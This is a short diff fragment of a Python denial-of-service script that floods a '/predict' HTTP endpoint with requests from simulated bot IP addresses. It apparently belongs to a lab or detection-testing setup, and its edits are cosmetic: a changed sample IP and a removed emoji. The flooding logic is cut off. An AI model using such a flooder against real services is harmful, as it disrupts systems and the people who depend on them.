@@ -17,14 +17,14 @@ bot_count = args.bot_count
 URL = f"http://{target_ip}:5000/predict"
 
 def generate_ips(count):
-    if count == 1: return ["192.168.1.5"]
+    if count == 1: return ["192.168.1.100"]
     return [f"192.168.1.{random.randint(2, 254)}" for _ in range(count)]
 
 attack_ips = generate_ips(bot_count)
 session = requests.Session()
 
 def send_flooding_requests():
-    print(f"🌊 Starting DoS Flood with {bot_count} bots against {target_ip}...")
+    print(f"Starting DoS Flood with {bot_count} bots against {target_ip}...")
     
     def flood(source_ip):
         # Increased request count for bots
